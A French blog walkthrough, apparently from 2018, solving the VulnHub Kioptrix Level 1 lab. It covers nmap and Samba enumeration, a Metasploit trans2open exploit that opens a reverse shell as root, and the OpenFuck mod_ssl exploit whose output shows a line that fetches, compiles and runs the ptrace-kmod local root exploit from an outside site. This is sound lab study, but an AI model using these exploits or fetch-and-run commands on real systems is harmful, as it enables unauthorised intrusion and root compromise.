# Solution du CTF Kioptrix: 1 de VulnHub

J'avais résolu le dernier (à l'heure de ces lignes) *Kioptrix* lors de sa sortie [en 2014](http://devloop.users.sourceforge.net/index.php?article79/solution-du-ctf-kioptrix-2014-5).  

Etant donné qu'il n'y en a pas eu de nouveaux dans la série, c'est l'occasion de se pencher sur les anciens.  

Tous les CTF Kioptrix sont simples et se résument souvent à une première vulnérabilité (web ou autre) permettant un accès distant puis l'utilisation d'un exploit local pour réaliser une escalade de privilèges.  

Ici il s'agit [du tout premier](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/) de la série.  

Let's go
--------

```plain
Nmap scan report for 192.168.1.104
Host is up (0.00068s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1          32768/tcp  status
|_  100024  1          32768/udp  status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: Potentially risky methods: TRACE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T08:32:06+00:00
|_Not valid after:  2010-09-26T08:32:06+00:00
|_ssl-date: 2018-02-13T22:06:12+00:00; +4h59m59s from local time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:4C:8A:19 (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: , NetBIOS MAC:  (unknown)
```

Côté Samba il n'y a rien d'intéressant à voir :  

```
$ nmblookup -A 192.168.1.104
Looking up status of 192.168.1.104
        KIOPTRIX        <00> -         B <ACTIVE> 
        KIOPTRIX        <03> -         B <ACTIVE> 
        KIOPTRIX        <20> -         B <ACTIVE> 
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> 
        MYGROUP         <00> - <GROUP> B <ACTIVE> 
        MYGROUP         <1d> -         B <ACTIVE> 
        MYGROUP         <1e> - <GROUP> B <ACTIVE> 

        MAC Address = 00-00-00-00-00-00

$ smbclient -U "" -N -L KIOPTRIX -I 192.168.1.104
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX
```

Un petit buster remonte quelques entrées intéressantes :  

```plain
http://192.168.1.104/cgi-bin/ - HTTP 403 (0 bytes, plain)
http://192.168.1.104/doc/ - HTTP 403 (0 bytes, plain)
http://192.168.1.104/icons/ - HTTP 200 (0 bytes, plain)
http://192.168.1.104/manual/ - HTTP 200 (0 bytes, plain)
http://192.168.1.104/mrtg/ - HTTP 200 (17318 bytes, plain)
http://192.168.1.104/usage/ - HTTP 200 (3704 bytes, plain)
```

Dont un *MRTG* pourtant aucun CGI correspondant n'a été trouvé sur le serveur :-(   

En fait le contenu du site ne semble pas avoir de véritable intérêt si ce n'est exposer des services et des infos sur les modules Apache.  

On peut aussi utiliser le module *apache\_userdir\_enum* de *Metasploit* avec une liste de noms d' utilisateurs, ce qui nous permet de trouver certains utilisateurs du système :  

```plain
[+] http://192.168.1.104/ - Users found: harold, john, operator, postgres, root, squid
```

Pwnage
------

Etant donné que le site Internet n'amène rien de probant, penchons nous sur les services en écoute.  

Metasploit a un exploit fiable pour ces vieilles versions de Samba :   

```plain
msf exploit(trans2open) > show options         

Module options (exploit/linux/samba/trans2open):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.1.104    yes       The target address
   RPORT  139              yes       The target port

Payload options (linux/x86/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.3      yes       The listen address
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce

msf exploit(trans2open) > exploit

[*] Started reverse TCP handler on 192.168.1.3:4444 
[*] 192.168.1.104:139 - Trying return address 0xbffffdfc...
[*] 192.168.1.104:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.104:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.104:139 - Trying return address 0xbffffafc...
[*] Sending stage (36 bytes) to 192.168.1.104
[*] Command shell session 1 opened (192.168.1.3:4444 -> 192.168.1.104:32770) at 2018-02-13 21:18:00 +0100

id
uid=0(root) gid=0(root) groups=99(nobody)
```

Et voilà !   

La version d'Apache / OpenSSL / mod\_ssl est aussi un bon candidat pour certains exploits bien connus (*OpenFuck*, *openssl-too-open*, et les [exploits ASN](http://devloop.users.sourceforge.net/index.php?article42/mass-apache-pwnage-from-romania)).  

La librairie openssl étant ce que l'on connaît, les exploits de l'époque ne se compilent pas avec la version actuelle de la librairie.  

On trouve tout de même [un article de blog](https://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/) expliquant comment mettre à jour le code de *OpenFuck*.  

Une fois cette étape passée, l'exploit a deux offsets correspondant à la distribution du challenge :  

```plain
        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
```

L'exploitation fonctionne sans problèmes :  

```plain
$ ./OpenFuck 0x6b 192.168.1.104

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80fc080
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- 
--14:22:23--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:80... connected!
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
--14:22:23--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

    0K ...                                                   100% @   3.74 MB/s

14:22:24 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]

[+] Attached to 15397
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

Flag
----

Contrairement à d'habitude le flag ne se trouvait pas sous /root. Il fallait accéder aux mails du système pour le trouver :  

```plain
$ ls /var/spool/mail -l
total 1
-rw-rw----    1 harold   harold          0 Sep 26  2009 harold
-rw-rw----    1 john     john            0 Sep 26  2009 john
-rw-rw----    1 nfsnobod nfsnobod        0 Sep 26  2009 nfsnobody
-rw-------    1 root     root         1005 Feb 13 11:10 root
$ cat /var/spool/mail/root
From root  Sat Sep 26 11:42:10 2009
Return-Path: <root@kioptix.level1>
Received: (from root@localhost)
        by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831
        for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root <root@kioptix.level1>
Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>
To: root@kioptix.level1
Subject: About Level 2
Status: O

If you are reading this, you got root. Congratulations.
Level 2 won't be as easy...

From root  Tue Feb 13 21:10:07 2018
Return-Path: <root@kioptrix.level1>
Received: (from root@localhost)
        by kioptrix.level1 (8.11.6/8.11.6) id w1DGA7P01152
        for root; Tue, 13 Feb 2018 21:10:07 -0500
Date: Tue, 13 Feb 2018 21:10:07 -0500
From: root <root@kioptrix.level1>
Message-Id: <201802132110.w1DGA7P01152@kioptrix.level1>
To: root@kioptrix.level1
Subject: LogWatch for kioptrix.level1

 ################## LogWatch 2.1.1 Begin ##################### 

 ###################### LogWatch End #########################
```

A noter que j'ai tenté de casser les hashs des utilisateurs *john* et *harold* avec la passlist *RockYou* sans résultat. La piste de la force brute était donc à écarter.  

Des walkthrough pour les autres CTF de la série vont suivre... stay tuned.  


*Published February 14 2018 at 18:03*